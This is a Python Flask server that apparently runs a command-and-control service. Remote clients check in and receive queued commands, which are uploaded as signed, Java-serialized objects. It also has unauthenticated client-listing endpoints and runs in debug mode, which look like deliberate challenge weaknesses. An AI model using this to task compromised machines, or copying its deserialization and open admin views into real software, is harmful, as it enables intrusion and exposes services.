#!/usr/bin/env python3

import base64
import os
import sqlite3
import time
import tempfile
import logging
import javaobj

from Crypto.Signature import DSS
from Crypto.PublicKey import DSA
from Crypto.Hash import SHA256

from datetime import datetime
from flask import Flask, Response, request, render_template
from logging import Formatter
from logging.handlers import RotatingFileHandler

app = Flask(__name__, static_url_path="/static/")
PREFIX = os.environ.get("PREFIX", "/")
WORKSPACE = os.environ.get("WORKSPACE", "/tmp/.../")

logger = logging.getLogger()
logger.setLevel(logging.INFO)
handler = RotatingFileHandler(
    os.path.join(WORKSPACE, ".log"), maxBytes=4096, backupCount=2
)
handler.setFormatter(
    Formatter("[%(asctime)s %(levelname)s] %(name)s - %(funcName)s: %(message)s")
)
logger.addHandler(handler)


class Command(object):
    pubkey: bytes = b"MIIDQjCCAjUGByqGSM44BAEwggIoAoIBAQCPeTXZuarpv6vtiHrPSVG28y7FnjuvNxjo6sSWHz79NgbnQ1GpxBgzObgJ58KuHFObp0dbhdARrbi0eYd1SYRpXKwOjxSzNggooi/6JxEKPWKpk0U0CaD+aWxGWPhL3SCBnDcJoBBXsZWtzQAjPbpUhLYpH51kjviDRIZ3l5zsBLQ0pqwudemYXeI9sCkvwRGMn/qdgYHnM423krcw17njSVkvaAmYchU5Feo9a4tGU8YzRY+AOzKkwuDycpAlbk4/ijsIOKHEUOThjBopo33fXqFD3ktm/wSQPtXPFiPhWNSHxgjpfyEc2B3KI8tuOAdl+CLjQr5ITAV2OTlgHNZnAh0AuvaWpoV499/e5/pnyXfHhe8ysjO65YDAvNVpXQKCAQAWplxYIEhQcE51AqOXVwQNNNo6NHjBVNTkpcAtJC7gT5bmHkvQkEq9rI837rHgnzGC0jyQQ8tkL4gAQWDt+coJsyB2p5wypifyRz6Rh5uixOdEvSCBVEy1W4AsNo0fqD7UielOD6BojjJCilx4xHjGjQUntxyaOrsLC+EsRGiWOefTznTbEBplqiuH9kxoJts+xy9LVZmDS7TtsC98kOmkltOlXVNb6/xF1PYZ9j897buHOSXC8iTgdzEpbaiH7B5HSPh++1/et1SEMWsiMt7lU92vAhErDR8C2jCXMiT+J67ai51LKSLZuovjntnhA6Y8UoELxoi34u1DFuHvF9veA4IBBQACggEADkENe3FyODSBndQfXkLHhXJWJr43CgzKOm3IauPLMOcKLipK3Ta8fzVLMZnnlqzcdiwhqI4wKtUz5K5ZXzuQ6BKAGPPgwYyzAJ32eYiC6GXtvOquBS38WSgz7k5WbJ+gvVAHiWnFtvlLZT0l2rtn2m2AyJaVbCiZxt18qzIPfLV5lNF8y/MOyBiWTJ0ooPwspQchURyl8JbMdHmoYovSscHNygYTPUleg7we00Q2hPiEKYMHrj+UBYzMhrmCSGoNHBV27IjK+KGEKEb1l8JZbu/4hI4S1YeJGLcZ9mROSrb4+BNpHzteZAF+MNDKPvTgVeDjNGAnIi4j+yhp0HqmHA=="

    def __init__(self, fd) -> None:
        obj: javaobj.JavaObject = javaobj.load(fd)
        self.type: str = "class " + obj.get_class().name
        self.recipient: str = obj.recipient
        self.run_after: int = obj.runAfter.second + obj.runAfter.nano / 1e9
        self.value: str = obj.value
        self.signature: bytes = bytes(
            map(lambda x: (x + 256) % 256, obj.signature._data)
        )

    def verify(self):
        pub = DSA.import_key(base64.b64decode(self.pubkey))
        hash = SHA256.new(self.__str__().encode())
        sig: DSS.FipsDsaSigScheme = DSS.new(pub, mode="fips-186-3", encoding="der")
        logger.info(f"Attempting to verify command:\n{self}")
        return sig.verify(hash, self.signature)

    def __str__(self) -> str:
        when = datetime.utcfromtimestamp(self.run_after)
        return (
            f"- Recipient: {self.recipient}\n"
            + f"- When: {when:%Y-%m-%dT%H:%M:%SZ}\n"
            + f"- Type: {self.type}\n"
            + f"- Value: {self.value}\n"
        )


@app.route("/HEALTHCHECK", methods=["GET", "POST"])
def healthcheck():
    return "OK", 200


@app.route(PREFIX, methods=["GET", "POST"])
def checkin():
    client_id = request.query_string.decode()
    checkin_time = time.time()

    with get_db() as db:
        db.execute(
            """
            INSERT INTO clients (id, last_checkin)
            VALUES (?,?)
            ON CONFLICT(id)
            DO UPDATE SET last_checkin=excluded.last_checkin
            """,
            (client_id, checkin_time),
        )
        db.execute(
            "INSERT INTO checkins VALUES (NULL, ?,?,?)",
            (client_id, checkin_time, request.get_data().decode(errors="replace")),
        )

        # Delete logs older than a week
        cutoff = checkin_time - 60 * 60 * 24 * 7
        db.execute("DELETE FROM checkins WHERE date < ?", (cutoff,))

    command = get_command_from_db(client_id)
    logger.info(f"checkin from {client_id}" + (", sending command" if command else ""))
    return Response(command, 200)


@app.route(PREFIX + "list")
def admin():
    with get_db() as db:
        c = db.execute("SELECT * FROM clients ORDER BY last_checkin DESC")
        logger.info("fetched list of clients")
        return get_response("admin", clients=c.fetchall())


@app.route(PREFIX + "<client_id>/checkins")
def checkins(client_id):
    with get_db() as db:
        c = db.execute(
            """
            SELECT date, content FROM checkins
            WHERE client=?
            ORDER BY date ASC
            """,
            (client_id,),
        )
        logger.info(f"fetched checkin history for client {client_id}")
        return get_response("checkins", checkins=c.fetchall())


@app.route(PREFIX + "<client_id>/commands")
def commands(client_id):
    with get_db() as db:
        c = db.execute(
            """
            SELECT delivered, run_after, content FROM commands
            WHERE client=?
            ORDER BY run_after ASC
            """,
            (client_id,),
        )
        logger.info(f"fetched commands for client {client_id}")
        return get_response("commands", commands=c.fetchall())


@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
def add_command(client_id):
    upload_file = request.files.get("file", None)
    if not upload_file:
        logger.warning("missing file argument")
        return Response("", 400)

    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
        command_file = f.name
        upload_file.save(command_file)

        try:
            obj = Command(f)
            obj.verify()

            logger.info(f"registering new command for client {client_id}")
            add_command_to_db(client_id, obj.run_after, command_file)
            return Response(f"OK\n", 200)

        except:
            logger.exception("invalid command or signature")
            return Response("", 400)


@app.template_filter()
def format_time(value: int):
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(value))


@app.template_filter()
def b64encode(value: bytes):
    return base64.b64encode(value).decode()


def get_response(template, **kwargs):
    response_type = "txt"  # if "curl" in request.user_agent.string else "html"
    return Response(render_template(f"{template}.{response_type}", **kwargs))


def get_command_from_db(client_id):
    with get_db() as db:
        c = db.cursor()
        c.execute(
            """
            SELECT content, run_after FROM commands
            WHERE client=? AND NOT delivered
            ORDER BY run_after ASC
            LIMIT 1
            """,
            (client_id,),
        )
        row = c.fetchone()
        if row:
            db.execute(
                "UPDATE commands SET delivered=TRUE WHERE client=? AND run_after=?",
                (client_id, row["run_after"]),
            )
            return row["content"]
        else:
            return ""


def add_command_to_db(client_id, run_after, command_path):
    with get_db() as db, open(command_path, "rb") as f:
        db.execute(
            """
            INSERT INTO commands (client, run_after, content)
            VALUES (?,?,?)
            ON CONFLICT(client, run_after)
            DO UPDATE SET content=excluded.content, delivered=FALSE
            """,
            (client_id, run_after, f.read()),
        )


def get_db() -> sqlite3.Connection:
    db = sqlite3.connect("db.sqlite3")
    db.execute("PRAGMA foreign_keys = ON")
    db.row_factory = sqlite3.Row
    return db


def create_db():
    with get_db() as db:
        db.execute(
            """
            CREATE TABLE IF NOT EXISTS clients (
                id CHARACTER(16) PRIMARY KEY,
                name TEXT,
                last_checkin FLOAT
            )
            """
        )
        db.execute(
            """
            CREATE TABLE IF NOT EXISTS checkins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client CHARACTER(16) REFERENCES clients(id) ON DELETE CASCADE,
                date FLOAT,
                content TEXT
            )
            """
        )
        c = db.execute(
            """
            CREATE TABLE IF NOT EXISTS commands (
                client CHARACTER(16) REFERENCES clients(id) ON DELETE CASCADE,
                run_after INT,
                delivered BOOLEAN DEFAULT FALSE,
                content BLOB,
                PRIMARY KEY (client, run_after)
            )
            """
        )


if __name__ == "__main__":
    create_db()
    app.run(host="0.0.0.0", port=8080, debug=True)
